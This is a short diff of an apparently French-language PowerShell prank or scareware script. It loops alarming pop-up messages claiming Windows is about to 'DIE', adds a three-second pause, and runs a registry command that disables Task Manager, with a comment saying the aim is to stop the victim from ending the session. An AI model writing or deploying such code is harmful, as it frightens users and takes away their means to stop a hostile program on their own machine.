@@ -17,6 +17,8 @@ for ($i=0; $i -lt 30; $i++) {
     msg * "💀 Windows est sur le point de DIE"
 }
 
+Start-Sleep -Seconds 3
+
 # Désactive Ctrl+Alt+Del pour empêcher la fermeture de session
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
 
